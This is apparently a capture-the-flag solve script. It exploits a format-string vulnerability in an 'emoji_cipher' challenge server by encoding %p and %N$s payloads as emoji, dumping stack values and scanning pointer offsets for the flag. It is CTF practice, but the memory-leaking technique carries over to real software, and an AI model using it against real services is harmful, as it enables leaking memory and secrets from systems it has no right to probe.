#!/usr/bin/env python3
"""Solve the emoji_cipher remote: it does printf(decode(your_emoji)), so the
decoded text is a FORMAT STRING. We encode a %p/%s payload as emoji, send it,
and read the leak. Needs the char->emoji map AUTOSCRAM wrote.

  python3 emoji_fmt.py                 # dump the stack via %p
  python3 emoji_fmt.py 7               # read %7$s (a specific offset)
  python3 emoji_fmt.py scan            # try %1$s..%40$s, grep for the flag
"""
import sys
from pwn import remote, context

context.log_level = "error"

HOST, PORT = "sfide.itscybergame.it", 13070
MAP = "/home/e06/Downloads/emoji_cipher.cipher_map.txt"

# char -> emoji
enc = {}
for line in open(MAP, encoding="utf-8"):
    ch, em = line.rstrip("\n").split("\t")
    enc[ch] = em


def emojify(s):
    # every printable ASCII (0x21-0x7e) has an emoji; avoid space (not in table)
    return "".join(enc[c] for c in s).encode()


def send_fmt(ascii_payload):
    """One request: send the emoji encoding of a format string, return output."""
    io = remote(HOST, PORT)
    io.sendline(emojify(ascii_payload))
    data = io.recvline(timeout=3)
    io.close()
    return data.rstrip(b"\n")


def dump_stack(n=40):
    # dots as separators (space isn't encodable); %i$p never dereferences -> safe
    payload = ".".join(f"%{i}$p" for i in range(1, n + 1))
    out = send_fmt(payload).decode(errors="replace")
    print("raw leak:\n", out, "\n")
    print("as ASCII (little-endian):")
    for i, tok in enumerate(out.split("."), 1):
        try:
            v = int(tok, 16)
        except ValueError:
            continue
        b = v.to_bytes(8, "little").rstrip(b"\x00")
        if b and all(0x20 <= c < 0x7f for c in b):
            print(f"  %{i}$p = {tok:>18}  -> {b.decode()!r}")


def read_s(off):
    print(f"%{off}$s ->", send_fmt(f"%{off}$s").decode(errors="replace"))


def scan():
    for off in range(1, 41):
        try:
            out = send_fmt(f"%{off}$s")
        except Exception:
            continue
        if b"{" in out or b"FLAG" in out.upper():
            print(f"  [*] %{off}$s -> {out.decode(errors='replace')!r}")


if __name__ == "__main__":
    arg = sys.argv[1] if len(sys.argv) > 1 else "dump"
    if arg == "dump":
        dump_stack()
    elif arg == "scan":
        scan()
    else:
        read_s(int(arg))
